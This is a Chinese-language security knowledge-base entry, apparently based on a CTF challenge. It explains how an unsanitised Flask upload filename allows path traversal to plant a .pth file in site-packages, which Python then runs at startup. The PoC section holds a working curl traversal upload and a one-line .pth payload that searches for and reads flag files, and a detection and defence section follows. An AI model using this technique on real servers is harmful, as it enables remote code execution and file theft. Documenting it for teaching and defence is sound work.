---
id: web-python-upload-traversal-pth-sitepackages-rce
title: 上传目录穿越写 .pth 到 site-packages：任意 Python 启动即执行
type: scenario
domain: web
path: web/python
technique: upload-traversal-pth-sitepackages-rce
tags:
- python
- flask
- file-upload
- path-traversal
- pth
- site-packages
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V124
  verified_at: '2026-11-06T04:17:20+08:00'
  notes: 已对照原文核对：server.py 中 filename 未过滤 + os.path.join(UPLOAD_FOLDER, filename)、/run 用 sys.executable 启动 launcher.py、launcher.py 提示 site-packages 路径、/app 根目录不可写而 /usr/local/lib/python3.10/site-packages 可写、上传 poc.txt 验证、写入以 import 开头的 .pth、上传 noop.py 后 /run 触发 site.py 自动执行并回显 flag 均一致。未验证点：无靶机，PoC 未复跑；原文未标注受影响版本；frontmatter 无 sources/source_url。
url: /docs/web/python/web-python-upload-traversal-pth-sitepackages-rce/
draft: false
kb_aliases:
- AutoPypy
- 上传穿越写 .pth
- site-packages 启动劫持
- Python .pth RCE
- Flask 上传路径穿越
---

## 一句话结论

Flask 上传接口把 `filename` 直接拼进保存路径时，可用 `../../usr/local/lib/python3.10/site-packages/evil.pth` 把文件写到 site-packages；随后任何一次 `/run` 启动的新 Python 进程都会由 `site.py` 自动执行 `.pth` 中以 `import` 开头的行，从而读取 flag 并混在 `/run` 返回中。

## 原理

- 上传逻辑 `os.path.join(UPLOAD_FOLDER, filename)` 未过滤 `../`，目录穿越可写到应用目录之外。
- Python 启动时 `site.py` 扫描 `site-packages/*.pth`，对以 `import ` 开头的行直接 `exec()`；因此写入 `.pth` 等价于“解释器启动即执行”。
- `/run` 每次都用 `subprocess.run([sys.executable, launcher_path, target_file], ...)` 启动新 Python；即使执行的是无害的 `noop.py`，启动阶段也会加载恶意 `.pth`。
- 应用根目录 `/app/launcher.py` 可能不可写，但 `site-packages` 往往可写；先探测目录权限再投放。
- `.pth` 代码搜索常见 flag 路径并写到 stdout；`/run` 捕获 stdout 并返回，flag 直接出现在响应里。

## 触发条件

- 上传接口存在目录穿越（`filename` 未过滤/未规范化）。
- Python 的 `site-packages` 目录对应用进程可写。
- 服务端会启动新的 Python 进程（如 `/run` 调用 `sys.executable`），且未使用 `-S` 跳过 site 初始化。
- 进程对 flag 文件有读权限。

## 利用步骤

1. 上传测试文件到 `../../usr/local/lib/python3.10/site-packages/poc.txt`，确认目录可写。
2. 上传恶意 `.pth`（文件名以 `.pth` 结尾，内容以 `import ` 开头），代码搜索 flag 路径并打印。
3. 上传/指定一个无害的 `noop.py`，调用 `/run` 触发新 Python 进程。
4. 从 `/run` 响应中读取 flag。
5. 清理 `.pth`（如可写）避免持续影响。

## PoC

```bash
curl -i -F "file=@solve.py;type=text/plain" \
  -F "filename=../../usr/local/lib/python3.10/site-packages/evil.pth" \
  "http://target/upload"
```

```python
# evil.pth 内容（一行，以 import 开头）
import sys;files=[p for pat in ('/flag','/flag.txt','/app/flag','/app/flag.txt','/root/flag','/root/flag.txt','/tmp/flag','/tmp/flag.txt','/*flag*','/app/*flag*','/root/*flag*','/home/*/flag*') for p in __import__('glob').glob(pat) if __import__('os').path.isfile(p)];sys.stdout.write(open(files[0],'r',errors='ignore').read() if files else 'FLAG_NOT_FOUND')
```

```python
# noop.py
print('noop')
```

## 变体与关联

- 目标目录可换成用户级 `site-packages`（配合 `site.addsitedir`）、`sitecustomize.py`、`usercustomize.py`。
- 若 `.pth` 被过滤，可写 `sitecustomize.py` 或 `PYTHONPATH` 目录中的模块。
- 关联：[[pentest-persistence-python-pth-sitepackages-autoload]]（.pth 启动持久化原理）、[[web-python-sandbox-site-packages-pth-sitecustomize-escape]]（site-packages 沙箱逃逸）。

## 检测与防御

- 上传文件名使用 `secure_filename`/白名单，保存前 `realpath` 校验必须位于上传目录内。
- 以只读方式挂载 `site-packages`，或使用 `python -S` 启动子进程；最小权限运行。
- 检测：上传请求中出现 `../`、`site-packages`、`.pth`；`/run` 启动的 Python 进程产生异常文件读取。
